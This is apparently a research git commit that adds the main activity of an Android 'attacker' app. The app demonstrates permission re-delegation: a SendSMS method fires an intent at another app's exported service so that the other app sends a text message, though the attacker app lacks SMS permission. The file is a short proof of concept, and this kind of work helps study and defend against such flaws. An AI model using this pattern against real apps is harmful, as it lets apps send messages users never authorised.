fe8e3de0b255cbd28f132db2452126f83c410dc4
Xi <xiz13@uci.edu>
2016-10-30 20:54:57 -0700

    permission re-delegation attacker

---
+++ app/src/main/java/edu/uci/seal/attacker/MainActivity.java
@@ -0,0 +1,27 @@
+package edu.uci.seal.attacker;
+
+import android.content.Intent;
+import android.os.Bundle;
+import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
+import android.view.View;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+    }
+
+    public void SendSMS(View v) {
+        Intent i = new Intent("com.example.android.directshare.SEND_SMS");
+        String phoneNumber = "9492476107";
+        String msg = "testing message";
+        i.putExtra("PHONE_NUMBER", phoneNumber);
+        i.putExtra("TEXT_MSG", msg);
+      //  i.setPackage(this.getPackageName());
+        Log.d("send", "send sms");
+        startService(i);
+    }
+}
